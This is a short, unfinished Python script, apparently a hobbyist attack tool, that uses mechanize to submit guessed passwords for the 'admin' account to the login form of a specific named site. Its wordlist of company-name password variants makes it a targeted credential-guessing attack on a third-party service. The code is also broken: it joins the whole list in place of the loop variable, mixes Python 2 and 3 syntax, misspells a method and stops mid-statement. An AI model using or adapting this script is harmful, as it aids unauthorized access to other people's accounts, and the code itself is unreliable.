from time import sleep

from bs4 import BeautifulSoup
from pip._vendor import requests
import crunch
import mechanize

print("[+]--------------------------------------------------[+]")
print("[+]-----               BY Z3r0Dy                -----[+]")
print("[+]-----                 Firts                  -----[+]")
print("[+]-----                 Urllib                 -----[+]")
print("[+]-----               Isuiteexpet              -----[+]")
print("[+]-----                                        -----[+]")
print("[+]--------------------------------------------------[+]")
sleep(1)
MotAcd = (["ACD","GROUPE","AZUR","CONCEPTION","PASS","TOURS","AIX","@cdgroupe","@cd13","@zur2000","azur2000","acdpass","@cdpass" ])
browser = mechanize.Browser()

browser.open('https://espaceaix.suiteexpert.fr//isuiteexpert/ACDiDiaClientService.svc/getUIDWEB')
for passw in MotAcd:
    browser.select_form(nr=0)
    browser.form['code'] = 'admin'
    browser.form['pass'] = ''.join(MotAcd)
    print "Verrification: " ,browser.form['pass']
    reponce = browser.submit()
    if reponce.getur() == ""

